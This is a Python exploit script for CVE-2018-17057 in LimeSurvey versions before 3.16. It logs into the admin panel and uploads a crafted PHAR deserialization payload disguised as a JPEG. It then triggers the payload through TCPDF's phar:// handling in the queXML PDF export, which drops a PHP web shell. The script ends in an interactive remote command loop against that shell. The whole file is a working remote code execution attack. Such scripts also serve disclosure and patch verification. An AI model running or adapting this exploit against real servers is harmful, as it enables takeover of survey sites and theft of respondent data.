#!/usr/bin/python3

# Description: LimeSurvey < 3.16 use a old version of "TCPDF" library, this version is vulnerable to a Serialization Attack via the "phar://" wrapper.
# Date: 29/03/2019
# Exploit Title: Remote Code Execution in LimeSurvey < 3.16 via Serialization Attack in TCPDF.
# Exploit Author: @q3rv0
# Google Dork:
# Version: < 3.16
# Tested on: LimeSurvey 3.15
# PoC: https://www.secsignal.org/news/remote-code-execution-in-limesurvey-3-16-via-serialization-attack-in-tcpdf
# CVE: CVE-2018-17057
# SecSignal is: <3
# Usage: python3 exploit.py [URL] [USERNAME] [PASSWORD]

import requests
import sys
import re

SESSION = requests.Session()

# Malicious PHAR generated with PHPGGC.
# ./phpggc Yii/RCE1 system "echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php" -p phar -o /tmp/exploit.jpg

PHAR = (b'<?php __HALT_COMPILER(); ?>\r\nY\x02\x00\x00\x02\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00'
	b'\x02\x02\x00\x00O:11:"CDbCriteria":1:{s:6:"params";O:12:"CMapIterator":3:{s:16:"\x00CMapIterator\x00_d";'
	b'O:10:"CFileCache":7:{s:9:"keyPrefix";s:0:"";s:7:"hashKey";b:0;s:10:"serializer";a:1:{i:1;s:6:"system";}'
	b's:9:"cachePath";s:10:"data:text/";s:14:"directoryLevel";i:0;s:11:"embedExpiry";b:1;s:15:"cacheFileSuffix";s:140:";'
	b'base64,OTk5OTk5OTk5OWVjaG8gM2MzZjcwNjg3MDIwNzM3OTczNzQ2NTZkMjgyNDVmNDc0NTU0NWIyMjYzMjI1ZDI5M2IyMDNmM2UwYSB8IHh4ZCAtciAtcCA+IHNoZWxsLnBocA==";}'
	b's:19:"\x00CMapIterator\x00_keys";a:1:{i:0;i:0;}s:18:"\x00CMapIterator\x00_key";i:0;}}\x05\x00\x00\x00dummy'
	b'\x04\x00\x00\x00\xfa\x0fR`\x04\x00\x00\x00\x0c~\x7f\xd8\xa4\x01\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00'
	b'test.txt\x04\x00\x00\x00\xfa\x0fR`\x04\x00\x00\x00\x0c~\x7f\xd8\xa4\x01\x00\x00\x00\x00\x00\x00testtest\n'
	b'\x98\x0e\x03\xddi#\xeb\x93\x9f\xe0\xe2\x00\xe0\x00\x7f\xcd\x00\xaf\xfd\x02\x00\x00\x00GBMB')
def usage():
    if len(sys.argv) != 4:
        print("[?] Usage: python3 exploit.py [URL] [USERNAME] [PASSWORD]")
        sys.exit(0)

def get(url):
	r = SESSION.get(url, verify=False)
	return r.text

def post(url, data={}, files=None, headers=None):
	r = SESSION.post(url, data=data, headers=headers, files=files, verify=False)
	return r.text

def getYIICSRFToken(url):
	res = get(url)
	token = re.findall(r'value="(.*)" name="YII_CSRF_TOKEN"', res)
	return token[0] 

def getKCSRFToken(url):
	res = get(url)
	token = re.findall(r'csrftoken = "(.*)";', res)
	return token[0]

def login(url, username, password):
	token = getYIICSRFToken(url)
	data = {
		"YII_CSRF_TOKEN" : token,
		"authMethod"     : "Authdb", 
		"user"           : username,
		"password"       : password,
		"loginlang"      : "default",
		"action"         : "login",
		"width"          : "1366",
		"login_submit"   : "login"
	}
	res = post(url, data)
	if len(re.findall("loginform", res)) == 0:
		return True
	else:
	    return False

def emailTemplates(url):
    return get(url)	

def createSurvey(url_newsurvey, url_insert):
	token = getYIICSRFToken(url_newsurvey)
	data = {
		"YII_CSRF_TOKEN" : token,
		"surveyls_title" : "Survey Example - SecSignal",
		"language"       : "en",
		"createsample"   : "0",
		"description"    : "foo",
		"url"            : "",
		"urldescrip"     : "",
		"dateformat"     : "1",
		"numberformat_en": "0",
		"welcome"        : "bar",
		"endtext"        : "asdf",
		"owner_id"       : "1",
		"admin"          : "Administrator",
		"adminemail"     : "test%40gsecsignal.org",
		"bounce_email"   : "test%40gsecsignal.org",
		"faxto"          : "",
		"gsid"           : "1",
		"format"         : "G",
		"template"       : "fruity",
		"navigationdelay": "0",
		"questionindex"  : "0",
		"showgroupinfo"  : "B",
		"showqnumcode"   : "X",
		"shownoanswer"   : "Y",
		"showxquestions" : "0",
		"showxquestions" : "1",
		"showwelcome"    : "0",
		"showwelcome"    : "1",
		"allowprev"      : "0",
		"nokeyboard"     : "0",
		"showprogress"   : "0",
		"showprogress"   : "1",
		"printanswers"   : "0",
		"publicstatistics" : "0",
		"publicgraphs"   : "0",
		"autoredirect"   : "0",
		"startdate"      : "",
		"expires"        : "",
		"listpublic"     : "0",
		"usecookie"      : "0",
		"usecaptcha_surveyaccess" : "0",
		"usecaptcha_registration" : "0",
		"usecaptcha_saveandload"  : "0",
		"datestamp"               : "0",
		"ipaddr"                  : "0",
		"refurl"                  : "0",
		"savetimings"             : "0",
		"assessments"             : "0",
		"allowsave"               : "0",
		"allowsave"               : "1",
		"emailnotificationto"     : "",
		"emailresponseto"         : "",
		"googleanalyticsapikeysetting" : "N",
		"googleanalyticsstyle"         : "0",
		"tokenlength"                  : "15",
		"anonymized"                   : "0",
		"tokenanswerspersistence"      : "0",
		"alloweditaftercompletion"     : "0",
		"allowregister"                : "0",
		"htmlemail"                    : "0",
		"htmlemail"                    : "1",
		"sendconfirmation"             : "0",
		"sendconfirmation"             : "1",
		"saveandclose"                 : "1"
	}
	res = post(url_insert, data)
	surveyid = re.findall(r'surveyid\\/([0-9]+)', res)
	return surveyid[0] # Return SurveyiD

def uploadPHAR(url_upload, url_csrf_token, phar):
	kcfinder_csrftoken = getKCSRFToken(url_csrf_token)
	files = {'upload[]': ('malicious.jpg', phar)}
	data  = {"dir"                : "files",
	    	"kcfinder_csrftoken" : kcfinder_csrftoken
	        }
	res = post(url_upload, data, files)
	return res

def pdfExport(url_pdf_export, surveyid):
	token = getYIICSRFToken(url_pdf_export + surveyid)
	data = {
		"save_language" : "en",
		"queXMLStyle"   : '<h1>Stage 2</h1><img src="phar://./upload/surveys/'+ surveyid + '/files/malicious.jpg">',
		"queXMLSingleResponseAreaHeight" : "9",
		"queXMLSingleResponseHorizontalHeight" : "10.5",
		"queXMLQuestionnaireInfoMargin" : "5",
		"queXMLResponseTextFontSize" : "10",
		"queXMLResponseLabelFontSize" : "7.5",
		"queXMLResponseLabelFontSizeSmall" : "6.5",
		"queXMLSectionHeight" : "18",
		"queXMLBackgroundColourSection" : "221",
		"queXMLBackgroundColourQuestion" : "241",
		"queXMLAllowSplittingSingleChoiceHorizontal" : "0",
		"queXMLAllowSplittingSingleChoiceHorizontal" : "1",
		"queXMLAllowSplittingSingleChoiceVertical" : "0",
		"queXMLAllowSplittingSingleChoiceVertical" : "1",
		"queXMLAllowSplittingMatrixText" : "0",
		"queXMLAllowSplittingMatrixText" : "1",
		"queXMLAllowSplittingVas" : "0",
		"queXMLPageOrientation" : "P",
		"queXMLPageFormat" : "A4",
		"queXMLEdgeDetectionFormat" : "lines",
		"YII_CSRF_TOKEN" : token,
		"ok" : "Y"
	}
	res = post(url_pdf_export + surveyid, data)
	return res        

def shell(url):
    r = requests.get(f"{url}/shell.php")
    if r.status_code == 200:
        print("[+] Pwned! :)")
        print("[+] Getting the shell...")
        while 1:
            try:
                cmd = input("$ ")
                r = requests.get(f"{url}/shell.php?c={cmd}")
                print(r.text)
            except KeyboardInterrupt:
                sys.exit("\nBye kaker!")
    else:
        print("[*] The site seems not to be vulnerable :(")

def main():
    usage()
    url      = sys.argv[1] # URL
    username = sys.argv[2] # Username
    password = sys.argv[3] # Password
    url_login = f"{url}/index.php/admin/authentication/sa/login"
    print("[*] Logging in to LimeSurvey...")
    if login(url_login, username, password):

        url_newsurvey = f"{url}/index.php/admin/survey/sa/newsurvey"
        url_insert = f"{url}/index.php/admin/survey/sa/insert"

        print("[*] Creating a new Survey...")
        surveyid = createSurvey(url_newsurvey, url_insert) 
        print(f"[+] SurveyID: {surveyid}")

        email_templates = f"{url}/index.php/admin/emailtemplates/sa/index/surveyid/{surveyid}"

        emailTemplates(email_templates)

        url_csrf_token = f"{url}/third_party/kcfinder/browse.php?opener=custom&type=files&CKEditor=email_invitation_en&langCode=en"
        url_upload     = f"{url}/third_party/kcfinder/browse.php?type=files&lng=en&opener=custom&act=upload"

        print("[*] Uploading a malicious PHAR...")
        uploadPHAR(url_upload, url_csrf_token, PHAR)

        url_pdf_export = f"{url}/index.php/admin/export/sa/quexml/surveyid/"

        print("[*] Sending the Payload...")
        export_response = pdfExport(url_pdf_export, surveyid)
        print(f"[*] TCPDF Response: {export_response}")

        shell(url)
    else:
        print("[-] Bad credentials :(")

if __name__ == "__main__":
    main()
